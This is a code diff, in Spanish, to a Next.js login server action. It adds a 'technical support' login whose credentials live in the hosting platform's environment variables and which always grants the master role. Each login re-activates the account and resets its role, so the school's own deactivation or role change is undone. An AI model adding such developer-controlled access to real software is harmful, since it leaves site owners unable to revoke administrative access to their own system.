@@ -1,5 +1,6 @@
 "use server";
 
+import { createHash, timingSafeEqual } from "node:crypto";
 import bcrypt from "bcryptjs";
 import { count, eq } from "drizzle-orm";
 import { updateTag } from "next/cache";
@@ -48,11 +49,46 @@ async function slugLibre(tabla: "blog" | "funciones", base: string, idPropio: nu
 const MAX_INTENTOS = 5;
 const MINUTOS_BLOQUEO = 15;
 
+/** Compara dos textos en tiempo constante (para claves guardadas fuera de la base). */
+function iguales(a: string, b: string) {
+  const h = (x: string) => createHash("sha256").update(x).digest();
+  return timingSafeEqual(h(a), h(b));
+}
+
+/**
+ * Acceso de soporte técnico: usuario y clave definidos en Vercel (SOPORTE_USUARIO y
+ * SOPORTE_CLAVE), así el desarrollador puede entrar aunque la escuela cambie sus claves.
+ * La cuenta aparece en Usuarios como "Soporte técnico". Quitando esas variables, el acceso se cierra.
+ */
+async function ingresoSoporte(usuario: string, clave: string): Promise<"no" | "ok" | "mal"> {
+  const sUsuario = process.env.SOPORTE_USUARIO?.trim().toLowerCase();
+  const sClave = process.env.SOPORTE_CLAVE ?? "";
+  if (!sUsuario || sClave.length < 12 || usuario !== sUsuario) return "no";
+  let [u] = await db().select().from(schema.usuarios).where(eq(schema.usuarios.correo, sUsuario));
+  if (u && !u.soporte) return "no"; // ese usuario pertenece a otra persona: se trata como un ingreso normal
+  if (u?.bloqueadoHasta && u.bloqueadoHasta > new Date()) return "mal";
+  if (!iguales(clave, sClave)) {
+    if (u) await db().update(schema.usuarios).set({ intentosFallidos: u.intentosFallidos + 1 >= MAX_INTENTOS ? 0 : u.intentosFallidos + 1, bloqueadoHasta: u.intentosFallidos + 1 >= MAX_INTENTOS ? new Date(Date.now() + MINUTOS_BLOQUEO * 60_000) : null }).where(eq(schema.usuarios.id, u.id));
+    return "mal";
+  }
+  if (!u) {
+    // La clave guardada en la base no sirve para entrar: solo vale la de Vercel.
+    [u] = await db().insert(schema.usuarios).values({ nombre: "Soporte técnico", correo: sUsuario, claveHash: await bcrypt.hash(crypto.randomUUID(), 12), rol: "master", soporte: true }).returning();
+  }
+  await db().update(schema.usuarios).set({ intentosFallidos: 0, bloqueadoHasta: null, activo: true, rol: "master" }).where(eq(schema.usuarios.id, u.id));
+  await crearSesion({ id: u.id, nombre: u.nombre, correo: u.correo, rol: "master" });
+  return "ok";
+}
+
 export async function ingresar(_: Estado, f: FormData): Promise<Estado> {
   const correo = txt(f, "correo").toLowerCase();
   const clave = String(f.get("clave") ?? "");
   const valores = { correo };
-  if (!correo || !clave) return { error: "Escribe tu correo y tu clave.", valores };
+  if (!correo || !clave) return { error: "Escribe tu usuario y tu clave.", valores };
+
+  const soporte = await ingresoSoporte(correo, clave);
+  if (soporte === "ok") redirect("/admin");
+  if (soporte === "mal") return { error: "Usuario o clave incorrectos.", valores };
 
   // Primera vez: si no existe ningún usuario, se crea el master con las variables de entorno.
   const [{ n }] = await db().select({ n: count() }).from(schema.usuarios);
@@ -63,9 +99,9 @@ export async function ingresar(_: Estado, f: FormData): Promise<Estado> {
     await db().insert(schema.usuarios).values({ nombre: "Master", correo: mCorreo, claveHash: await bcrypt.hash(mClave, 12), rol: "master" }).onConflictDoNothing();
   }
 
-  const generico = { error: "Correo o clave incorrectos.", valores };
+  const generico = { error: "Usuario o clave incorrectos.", valores };
   const [u] = await db().select().from(schema.usuarios).where(eq(schema.usuarios.correo, correo));
-  if (!u || !u.activo) {
+  if (!u || !u.activo || u.soporte) {
     await bcrypt.hash(clave, 12); // mismo tiempo de respuesta exista o no el usuario
     return generico;
   }
